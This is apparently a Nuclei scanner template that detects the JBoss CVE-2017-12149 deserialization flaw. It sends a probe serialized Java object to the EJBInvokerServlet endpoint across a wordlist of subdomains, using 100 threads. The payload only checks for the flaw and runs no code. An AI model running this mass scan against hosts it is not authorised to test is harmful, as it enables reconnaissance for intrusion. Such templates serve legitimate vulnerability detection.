id: CVE-2017-12149 2
info:
  author: fopina
  description: In Jboss Application Server as shipped with Red Hat Enterprise Application
    Platform 5.2, it was found that the doFilter method in the ReadOnlyAccessFilter
    of the HTTP Invoker does not restrict classes for which it performs deserialization
    and thus allowing an attacker to execute arbitrary code via crafted serialized
    data.
  name: Java/Jboss Deserialization [RCE]
  reference: '- https://nvd.nist.gov/vuln/detail/CVE-2017-12149

    - https://chowdera.com/2020/12/20201229190934023w.html

    - https://github.com/vulhub/vulhub/tree/master/jboss/CVE-2017-12149

    '
  severity: critical
  tags: cve,cve2017,java,rce,deserialization
requests:
- attack: sniper
  matchers:
  - part: body
    type: word
    words:
    - ClassCastException
  - part: header
    type: word
    words:
    - application/x-java-serialized-object
  matchers-condition: and
  payloads:
    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
  raw:
  - 'POST /invoker/EJBInvokerServlet/ HTTP/1.1

    Host: {{Subdomains}}

    User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like
    Gecko) Chrome/41.0.2225.0 Safari/537.36

    Connection: close

    Content-Length: 82

    Content-Type: application/octet-stream

    Accept-Encoding: gzip, deflate


    {{ base64_decode("rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAACdwQAAAACdAAJZWxlbWVudCAxdAAJZWxlbWVudCAyeA==")
    }}

    '
  threads: 100
